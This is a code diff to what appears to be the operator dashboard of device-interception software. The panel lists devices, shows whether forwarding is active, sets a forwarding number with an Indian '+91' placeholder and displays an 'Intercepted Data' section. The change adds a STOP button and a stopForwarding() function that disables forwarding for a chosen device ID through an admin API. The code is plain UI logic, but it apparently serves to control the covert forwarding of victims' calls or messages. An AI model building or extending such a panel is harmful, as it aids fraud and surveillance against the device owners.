@@ -595,7 +595,10 @@
                     (activeUser.forwarding_enabled ? '<span style="color: var(--success); background: rgba(52,199,89,0.1); padding: 3px 8px; border-radius: 6px; margin-left: 8px; font-size: 10px;">ACTIVE</span>' : '<span style="color: var(--accent); background: rgba(255,59,48,0.1); padding: 3px 8px; border-radius: 6px; margin-left: 8px; font-size: 10px;">INACTIVE</span>') +
                     '</span>' +
                     '<input type="tel" class="custom-input" id="fwdNum" value="' + currentInputValue + '" placeholder="+91 00000 00000">' +
-                    '<button class="action-btn" onclick="saveForwarding()"><i class="ph-bold ph-lightning"></i> SYNC PROTOCOL</button>' +
+                    '<div style="display: flex; gap: 10px;">' +
+                        '<button class="action-btn" onclick="saveForwarding()"><i class="ph-bold ph-lightning"></i> SYNC</button>' +
+                        '<button class="action-btn" style="background: var(--accent); box-shadow: 0 10px 20px rgba(255,59,48,0.3);" onclick="stopForwarding()"><i class="ph-bold ph-stop"></i> STOP</button>' +
+                    '</div>' +
                 '</div>' +
                 '<span class="control-label">Intercepted Data</span>' +
                 '<div class="tab-bar">' +
@@ -632,6 +635,26 @@
             } catch (err) { 
                 console.error('Sync Error:', err);
                 showToast('Sync Failed: ' + err.message, true); 
+            }
+        }
+
+        async function stopForwarding() {
+            try {
+                const res = await fetch('/api/admin/update-forwarding', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId: activeUser.device_id, number: '', enabled: false })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showToast('Protocol Stopped Successfully');
+                    fetchData(); // Refresh to get updated state
+                } else {
+                    throw new Error(data.error);
+                }
+            } catch (err) { 
+                console.error('Stop Error:', err);
+                showToast('Stop Failed: ' + err.message, true); 
             }
         }
 
